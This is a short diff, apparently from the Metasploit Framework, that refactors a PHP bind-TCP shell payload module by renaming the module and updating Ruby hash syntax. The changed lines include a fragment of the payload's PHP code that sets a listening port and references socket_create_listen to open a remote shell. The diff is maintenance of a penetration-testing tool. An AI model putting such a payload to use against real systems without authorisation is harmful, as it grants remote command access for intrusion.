@@ -9,7 +9,7 @@ require 'msf/core/handler/bind_tcp'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
-module Metasploit3
+module MetasploitModule
 
   CachedSize = :dynamic
 
@@ -43,7 +43,7 @@ module Metasploit3
 
     dis = '$' + Rex::Text.rand_text_alpha(rand(4) + 4);
     shell = <<-END_OF_PHP_CODE
-    #{php_preamble({:disabled_varname => dis})}
+    #{php_preamble(disabled_varname: dis)}
     $port=#{datastore['LPORT']};
 
     $scl='socket_create_listen';
